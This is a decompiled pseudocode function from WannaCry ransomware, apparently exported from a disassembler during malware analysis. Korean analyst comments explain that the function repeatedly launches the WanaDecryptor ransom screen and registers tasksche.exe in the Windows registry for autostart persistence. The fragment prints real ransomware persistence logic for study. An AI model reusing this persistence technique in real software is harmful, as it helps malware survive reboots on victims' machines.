// --- Metadata ---
// Function Name: autostartWanaDecryptor_10004990
// Address: 0x10004990
// Exported At: 20250522_124057
// Signature: unknown_signature
// ---------------
void __stdcall __noreturn autostartWanaDecryptor_10004990(LPVOID lpThreadParameter)
{
  int v1; // esi
  CHAR Buffer; // [esp+10h] [ebp-208h] BYREF
  char v3[516]; // [esp+11h] [ebp-207h] BYREF
  __int16 v4; // [esp+215h] [ebp-3h]
  char v5; // [esp+217h] [ebp-1h]

  while ( 1 )                                   // WanaDecryptor를 실행하고, 부팅 시 자동 실행되도록 레지스트리에 등록 
  {
    if ( time(0) >= (int)Time && dword_1000DCE0 > 0 )
    {
      v1 = 0;
      if ( !Time )
      {
        v1 = 1;
        Time = (__time32_t *)time(0);
        CwnryIO_10001000(&unk_1000D958, 0);
      }
      LaunchWanaDecryptor_10004890();
      if ( v1 )
      {
        Buffer = byte_1000DD98;
        memset(v3, 0, sizeof(v3));
        v4 = 0;
        v5 = 0;
        GetFullPathNameA("tasksche.exe", 0x208u, &Buffer, 0);
        autostartViaRegedit_100047F0(&Buffer);  // 윈도우 레지스트리 기반 영속성(persistence) 확보 
      }                                         // 무작위 키 이름 생성과 관리자 권한 분기 사용은 분석을 어렵게 하기 위한 조치 
    }
    Sleep(0x7530u);
  }
}
